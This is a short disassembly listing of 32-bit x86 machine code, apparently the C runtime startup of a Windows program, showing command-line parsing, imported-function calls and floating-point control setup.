  40234b:	89 5d d0             	mov    %ebx,-0x30(%ebp)
  40234e:	8d 45 a4             	lea    -0x5c(%ebp),%eax
  402351:	50                   	push   %eax
  402352:	ff 15 44 30 40 00    	call   *0x403044
  402358:	f6 45 d0 01          	testb  $0x1,-0x30(%ebp)
  40235c:	74 11                	je     0x40236f
  40235e:	0f b7 45 d4          	movzwl -0x2c(%ebp),%eax
  402362:	eb 0e                	jmp    0x402372
  402364:	80 3e 20             	cmpb   $0x20,(%esi)
  402367:	76 d8                	jbe    0x402341
  402369:	46                   	inc    %esi
  40236a:	89 75 8c             	mov    %esi,-0x74(%ebp)
  40236d:	eb f5                	jmp    0x402364
  40236f:	6a 0a                	push   $0xa
  402371:	58                   	pop    %eax
  402372:	50                   	push   %eax
  402373:	56                   	push   %esi
  402374:	53                   	push   %ebx
  402375:	53                   	push   %ebx
  402376:	ff 15 40 30 40 00    	call   *0x403040
  40237c:	50                   	push   %eax
  40237d:	e8 2e fe ff ff       	call   0x4021b0
  402382:	89 45 98             	mov    %eax,-0x68(%ebp)
  402385:	50                   	push   %eax
  402386:	ff 15 7c 30 40 00    	call   *0x40307c
  40238c:	8b 45 ec             	mov    -0x14(%ebp),%eax
  40238f:	8b 08                	mov    (%eax),%ecx
  402391:	8b 09                	mov    (%ecx),%ecx
  402393:	89 4d 88             	mov    %ecx,-0x78(%ebp)
  402396:	50                   	push   %eax
  402397:	51                   	push   %ecx
  402398:	e8 0f 00 00 00       	call   0x4023ac
  40239d:	59                   	pop    %ecx
  40239e:	59                   	pop    %ecx
  40239f:	c3                   	ret
  4023a0:	8b 65 e8             	mov    -0x18(%ebp),%esp
  4023a3:	ff 75 88             	push   -0x78(%ebp)
  4023a6:	ff 15 84 30 40 00    	call   *0x403084
  4023ac:	ff 25 80 30 40 00    	jmp    *0x403080
  4023b2:	ff 25 70 30 40 00    	jmp    *0x403070
  4023b8:	68 00 00 03 00       	push   $0x30000
  4023bd:	68 00 00 01 00       	push   $0x10000
  4023c2:	e8 0f 00 00 00       	call   0x4023d6
  4023c7:	59                   	pop    %ecx
  4023c8:	59                   	pop    %ecx
  4023c9:	c3                   	ret
  4023ca:	33 c0                	xor    %eax,%eax
  4023cc:	c3                   	ret
  4023cd:	c3                   	ret
  4023ce:	cc                   	int3
  4023cf:	cc                   	int3
  4023d0:	ff 25 58 30 40 00    	jmp    *0x403058
  4023d6:	ff 25 50 30 40 00    	jmp    *0x403050
  4023dc:	cc                   	int3
  4023dd:	cc                   	int3
  4023de:	cc                   	int3
  4023df:	cc                   	int3
  4023e0:	ff 25 54 30 40 00    	jmp    *0x403054
